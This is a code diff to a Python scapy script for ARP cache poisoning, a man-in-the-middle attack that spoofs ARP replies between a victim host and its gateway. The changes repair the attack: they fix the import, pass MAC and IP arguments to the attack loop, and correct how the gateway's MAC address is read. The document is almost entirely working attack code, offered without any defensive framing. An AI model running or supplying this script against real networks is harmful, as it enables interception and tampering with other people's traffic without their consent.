@@ -2,7 +2,7 @@
 
 
 import os, sys, time
-from scapy import *
+from scapy.all import *
 
 
 def poison(gMAC, vMAC, gIP, vIP):
@@ -13,7 +13,7 @@ def cure(gMAC, vMAC, gIP, vIP):
     send(ARP(op = 2, pdst = gIP, psrc = vIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = vMAC), count = 5)
     send(ARP(op = 2, pdst = vIP, psrc = gIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gMAC), count = 5)
 
-def attack():
+def attack(gatewayMAC, victimMAC, gatewayIP, victimIP):
     try:
         print "Poisioning..!!"
         while True:
@@ -39,17 +39,17 @@ def Main():
         ans_victims, unans_victims = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = victimIP), timeout = 2, iface = interface, inter = 0.1)
         victimMAC = ans_victims[0][1].hwsrc
         ans_gateway, unans_gateway = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = gatewayIP), timeout = 2, iface = interface, inter = 0.1)
-        gatewayMAC = ans_victims[0][1].hwsrc
+        gatewayMAC = ans_gateway[0][1].hwsrc
 
-        print "Victim's MAC addrs: " + victimMac
-        print "Gateway's MAC addrs: " + gatewayMAC
+#        print "Victim's MAC addrs: " + victimMac
+#        print "Gateway's MAC addrs: " + gatewayMAC
 
     except Exception:
         print "Unable to get MAC Addrs..!! Because of: "+str(Exception)
         print "Exiting..!!"
         sys.exit(1)
 
-    attack()
+    attack(gatewayMAC, victimMAC, gatewayIP, victimIP)
 
 
 if __name__ == '__main__':
